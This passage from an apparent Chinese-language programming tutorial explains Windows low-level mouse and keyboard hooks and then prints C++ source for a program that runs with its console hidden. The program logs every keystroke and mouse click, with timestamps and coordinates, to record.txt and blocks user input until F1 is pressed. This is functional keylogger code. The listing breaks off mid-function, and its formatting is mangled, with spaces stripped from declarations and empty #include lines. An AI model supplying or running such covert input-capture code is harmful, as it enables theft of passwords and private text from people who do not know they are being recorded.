第二个参数代表windows消息包含鼠标按键和鼠标移动：`WM_LBUTTONDOWN`、`WM_LBUTTONUP`和`WM_RBUTTONDOWN`、`WM_RBUTTONUP`，我们着重这四个消息，分别代表鼠标左键的按下、放开和右键的按下、放开。（因为我们不拦截鼠标移动消息，只拦截鼠标左右按键按下的消息。）
第三个参数指向[ **MSLLHOOKSTRUCT**](https://msdn.microsoft.com/en-us/library/ms644970\(v=vs.85\))结构的指针，结构体指针。
### **（2）MSLLHOOKSTRUCT结构体**
    typedefstructtagMSLLHOOKSTRUCT {
    POINThttps://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85);//POINT结构体，pt->x、pt->y记录鼠标的x、y坐标
    DWORDmouseData;
    DWORDflags;
    DWORDtime;
    ULONG_PTRdwExtraInfo;
    } MSLLHOOKSTRUCT, *LPMSLLHOOKSTRUCT, *PMSLLHOOKSTRUCT;
鼠标钩子这里我们只需要明白这个结构体的第一个成员`pt`，指向一个[POINT](https://docs.microsoft.com/en-us/previous-versions/dd162805\(v=vs.85\))结构。
用于记录鼠标发出点击事件时的坐标。
### **（3）识别鼠标按键消息**
    //同样是记录消息产生时间
    SYSTEMTIME time;
    GetLocalTime(&time);
    char Date_Key[200] = { 0 };
    sprintf(Date_Key, "%d-%02d-%02d %02d:%02d:%02d\t", time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);
    switch (wParam)
    {
    case WM_LBUTTONDOWN:
    strcat(Date_Key, "WM_L_BUTTON_DOWN");
    break;
    case WM_LBUTTONUP:
    strcat(Date_Key, "WM_L_BUTTON_UP");
    break;
    case WM_RBUTTONDOWN:
    strcat(Date_Key, "WM_R_BUTTON_DOWN");
    break;
    case WM_RBUTTONUP:
    strcat(Date_Key, "WM_R_BUTTON_UP");
    break;
    default:
    return 0;
    }
这里`default: return
0;`表示，如果鼠标钩子钩取的鼠标消息，不是我们预定的四个鼠标按键消息，即是鼠标移动的消息，那么就将钩子过程函数`return
0;`，代表将这个鼠标移动的消息正常传递给窗口过程函数，即不拦截。
### **（4）拦截鼠标按键消息，记录到文件**
    intlen=strlen(Date_Key);
    sprintf(Date_Key+len, " pX=%d,pY=%d\n", p->pt.x, p->pt.y);
    len=strlen(Date_Key);
    ​
    //将消息记录写入文件
    if (!WriteMessageToFile(Date_Key, len)) {
    exit(0);
      }
    ​
    return1;
这里是钩子过程函数结尾，所以直接`return 1;`代表钩子拦截消息。
以上就是钩子函数的过程函数设定了。
## 5、总结
根据前面设定键盘钩子、鼠标钩子，我们可以发现相似点。
不管是键盘钩子的过程函数：[微软官方：LowLevelKeyboardProc 回调函数](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985\(v=vs.85\))，
还是鼠标钩子的过程函数：[微软官方：LowLevelMouseProc 回调函数](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644986\(v=vs.85\))
**其实函数类型都是一样的，只是参数的用法不同而已。包括第二个参数wParam都是代表windows消息类型，第三个参数指向的结构体，虽然定义不同，但可以发现，本质是一样的，也就是可以说他们就是一样的结构体，只是当我们设定不同类型钩子的时候，这个结构体成员代表的意义也不同。**
**我们再回头去看**[微软官方文档：SetWindowsHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)，可以发现，说这个API第二个参数是函数指针，类型为 **HOOKPROC** 。
那么就再去查一下 **HOOKPROC** ，果然：[微软官方文档：HOOKPROC
回调函数](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nc-winuser-hookproc)，告诉我们，这个函数的第三个参数是指向[CWPRETSTRUCT](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-cwpretstruct)结构的指针。
就发现，键盘钩子指向的[ **KBDLLHOOKSTRUCT**](https://msdn.microsoft.com/en-us/library/ms644967\(v=vs.85\))结构和鼠标钩子指向的[
**MSLLHOOKSTRUCT**](https://msdn.microsoft.com/en-us/library/ms644970\(v=vs.85\))结构本质上都是[CWPRETSTRUCT](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-cwpretstruct)结构。
## 6、演示效果
执行效果，因为不显示控制台窗口，所以执行后没有任何显示，但是此时键盘、鼠标按键已经被拦截失效，直到按`F1`键同时卸载鼠标、键盘钩子，恢复正常，拦截的消息记录在exe同文件下生成的record.txt文件。
  1. 拦截全局键盘，识别大小写和特殊字符，（不响应键盘所有按键）。
  2. 鼠标点击消息，识别左右按键，不拦截鼠标移动消息，（鼠标可以正常移动，无法响应点击）。
  3. 将按键消息和鼠标点击消息记录在文件里。
  4. 直到按下`F1`键时，卸载全局键盘、鼠标钩子，所有恢复正常。
按下`F1`后，会弹出MessageBox提示已经卸载钩子。
**然后打开record.txt文件，记录鼠标键盘按键消息。**
## 7、所有源码
因为写在主程序里，所以就一个cpp文件。
    //环境：Win10
    //编译：VS2019，创建简单的C++空项目。
    #define _CRT_SECURE_NO_DEPRECATE//屏蔽VS的一些安全警告。。。
    ​
    //预编译，让控制台窗口程序，不显示控制台窗口，直接后台运行。。。
    #pragma comment(linker, "/subsystem:\"windows\"   /entry:\"mainCRTStartup\"")
    ​
    #include
    #include 
    #include 
    ​
    ​
    ​
    //全局键盘Hook句柄
    HHOOKhKeyboardHook;
    ​
    //全局鼠标hook句柄
    HHOOKhMouseHook;
    ​
    //安装钩子hook的函数
    BOOLHookKeyBoardProc();
    ​
    //记录Shift消息
    BOOLbShift=FALSE;
    ​
    ​
    //表示按键F1即卸载钩子
    charexitKey[20] ="WM_KEYUP_[F1]";
    ​
    //键盘钩子过程函数
    LRESULTCALLBACKKeyBoardProc(intnCode, WPARAMwParam, LPARAMlParam);
    //鼠标钩子键盘函数
    LRESULTCALLBACKMouseCursorProc(intnCode, WPARAMwParam, LPARAMlParam);
    ​
    //根据钩子过程函数的参数消息，返回按键的字符（大小写、特殊字符）
    //参数1：按键虚拟码,即键盘上每个按键对应一个虚拟码，不区分大小写，微软官方文档：https://docs.microsoft.com/zh-cn/windows/win32/inputdev/virtual-key-codes
    //参数2：是否按下大写按键，TRUE代表按下
    //参数3：是否按住shift按键，TRUE代表正按住
    //参数4：函数返回的按键字符，存储在Out指针指向的内存。
    //返回值：无
    voidHookCode(DWORDcode, BOOLcaps, BOOLshift ,char*Out);
    ​
    //将记录的键盘、鼠标信息写入文件
    BOOLWriteMessageToFile(char*Date_Key, intlen);
    ​
    //int KeyN = 0;
    ​
    intmain() {
    ​
    HookKeyBoardProc();
    return0;
    }
    ​
    /********************************************************
    函数作用：设置键盘钩子
    返回值：是否hook成功
    *********************************************************/
    BOOLHookKeyBoardProc() {
    ​
    hKeyboardHook=SetWindowsHookExA(WH_KEYBOARD_LL, KeyBoardProc, GetModuleHandle(NULL),NULL );
    hMouseHook=SetWindowsHookExA(WH_MOUSE_LL, MouseCursorProc, GetModuleHandle(NULL), NULL);
    //hMouseHook = (HHOOK)1;
    ​
    if (!(hKeyboardHook&&hMouseHook )) {
    //printf("Failed to SetWindowsHookEx!\n");
    //MessageBox(NULL, L"SetWindowsHookEx Failed!", L"Tip", NULL);
    returnFALSE;
    }
    else {
    //printf("Start to SetWindowsHookEx!\n");
    //MessageBox(NULL, L"SetWindowsHookEx Success!", L"Tip", NULL);
    ​
    MSGMsg{};
    while (GetMessage(&Msg, NULL, 0, 0) >0) {
    TranslateMessage(&Msg);
    DispatchMessage(&Msg);
    }
    ​
    //Sleep(5000);
    }
    returnTRUE;
    }
    /********************************************************
    函数作用：将字符消息写入对应文件。
    返回值：是否写入成功acq
    *********************************************************/
    BOOLWriteMessageToFile(char*Date_Key, intlen) {
    ​
    HANDLEhFile=CreateFileA(
    "./record.txt",
    GENERIC_WRITE|GENERIC_READ,
    0,
    NULL,
    OPEN_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL
      );
    if (hFile==INVALID_HANDLE_VALUE) {
    MessageBox(NULL, L"open file failed!", L"tip", NULL);
    returnFALSE;
      }
    SetFilePointer(hFile, NULL, NULL, FILE_END);
    DWORDdwWrited=0;
    WriteFile(hFile, Date_Key, len , &dwWrited, NULL);
    CloseHandle(hFile);
    ​
    returnTRUE;
    }
    ​
    /********************************************************
    函数作用：鼠标钩子回调
    返回值：是否hook成功acq
    *********************************************************/
    LRESULTCALLBACKMouseCursorProc(intnCode, WPARAMwParam, LPARAMlParam) {
    PMSLLHOOKSTRUCTp= (PMSLLHOOKSTRUCT)lParam;
    ​
    SYSTEMTIMEtime;
    GetLocalTime(&time);
    charDate_Key[200] = { 0 };
    sprintf(Date_Key, "%d-%02d-%02d %02d:%02d:%02d\t", time.wYear, time.wMonth, time.wDay, time.wHour, time.wMinute, time.wSecond);
    ​
    switch (wParam)
      {
    caseWM_LBUTTONDOWN:
    strcat(Date_Key, "WM_L_BUTTON_DOWN");
    break;
    caseWM_LBUTTONUP:
    strcat(Date_Key, "WM_L_BUTTON_UP");
    break;
    caseWM_RBUTTONDOWN:
    strcat(Date_Key, "WM_R_BUTTON_DOWN");
    break;
    caseWM_RBUTTONUP:
    strcat(Date_Key, "WM_R_BUTTON_UP");
    break;
    default:
    return0;
      }
    intlen=strlen(Date_Key);
    sprintf(Date_Key+len, " pX=%d,pY=%d\n", p->pt.x, p->pt.y);
    len=strlen(Date_Key);
    ​
    //将消息记录写入文件
    if (!WriteMessageToFile(Date_Key, len)) {
    exit(0);
      }
    return1;
    }
    ​
    /********************************************************
    函数作用：键盘钩子回调
    返回值：是否hook成功acq
    *********************************************************/
    LRESULTCALLBACKKeyBoardProc(intnCode, WPARAMwParam, LPARAMlParam) {
    PKBDLLHOOKSTRUCTp= (PKBDLLHOOKSTRUCT)lParam;
    BOOLcaps=FALSE;  // 默认大写关闭